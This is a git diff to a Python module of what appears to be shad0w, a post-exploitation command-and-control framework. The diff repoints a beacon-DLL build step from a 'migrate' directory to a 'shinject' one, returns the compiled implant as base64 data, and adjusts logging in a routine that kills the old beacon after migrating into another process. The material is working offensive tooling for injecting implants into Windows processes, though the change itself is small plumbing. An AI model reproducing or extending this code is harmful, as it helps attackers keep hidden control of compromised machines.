@@ -97,11 +97,11 @@ def get_dll_data(file_loc):
 
 def generate_beacon_dll(shad0w, rcode):
     # write header file
-    write_header(rcode, "/root/shad0w/modules/windows/migrate/beacon.h")
+    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")
 
     # build the dll
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/migrate/", basedir="/root/shad0w/modules/windows/migrate/")
-    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/migrate/module.dll", builddir=os.getcwd(), make_target="x64")
+    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/", basedir="/root/shad0w/modules/windows/shinject/")
+    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")
 
     # check that the dll has built
     if made != True:
@@ -109,7 +109,7 @@ def generate_beacon_dll(shad0w, rcode):
         return
 
     # return the base64 dll data
-    return get_dll_data("/root/shad0w/modules/windows/migrate/module.dll")
+    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")
 
 def await_impersonate(shad0w, pid):
     while True:
@@ -119,11 +119,12 @@ def await_impersonate(shad0w, pid):
             imp_beacon_id = shad0w.beacons[shad0w.current_beacon]["impersonate"]
 
             shad0w.beacons[shad0w.current_beacon]["task"] = (0x6000, None)
+            shad0w.debug.log("Tasked beacon to die", log=True)
 
             shad0w.current_beacon = imp_beacon_id
-
-            shad0w.debug.good(f"Migrated ({pid})")
             break
+
+    shad0w.debug.good(f"Successfully migrated ({pid})")
     return
 
 def main(shad0w, args):
